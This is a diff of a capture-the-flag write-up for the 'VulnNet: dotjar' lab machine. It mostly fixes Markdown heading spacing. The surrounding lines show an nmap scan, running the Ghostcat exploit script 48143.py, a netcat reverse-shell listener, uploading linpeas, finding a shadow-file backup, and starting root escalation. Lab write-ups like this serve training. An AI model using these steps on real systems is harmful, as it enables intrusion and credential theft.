@@ -1,6 +1,6 @@
-##VulnNet: dotjar
+## VulnNet: dotjar
 
-#Enumeration
+# Enumeration
 ```
 # Nmap 7.91 scan initiated Sat May  8 17:50:12 2021 as: nmap -sCV -oN nmap/initial -vvv -p 8009,8080 10.10.3.26
 Nmap scan report for 10.10.3.26
@@ -34,6 +34,7 @@ Apache Tomcat - AJP 'Ghostcat' File Read/Inclusion (Metasploit)                 
 -------------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
 ```
+
 and then use it as follows
 ```
 # python2 48143.py 10.10.3.26                                                                                     
@@ -123,7 +124,7 @@ zsh: suspended  nc -nlvp 4242
 web@vulnnet-dotjar:/$
 ```
 
-#Initial Foothold
+# Initial Foothold
 
 Out initial checks for sudo privileges, SUID binaries, and cronjobs doesn't provide us any avenue of ecalation so we go ahead and upload linpeas to end up finding a file /var/backups/shadow-backup-alt.gz
 ```
@@ -224,7 +225,7 @@ drwxr-xr-x  2 jdk-admin jdk-admin 4096 Jan 15 15:29 Videos
 -rw-------  1 jdk-admin jdk-admin 2522 Jan 15 17:49 .xsession-errors.old
 ```
 
-#Root Escalation
+# Root Escalation
 ```
 jdk-admin@vulnnet-dotjar:~$ sudo -l
 
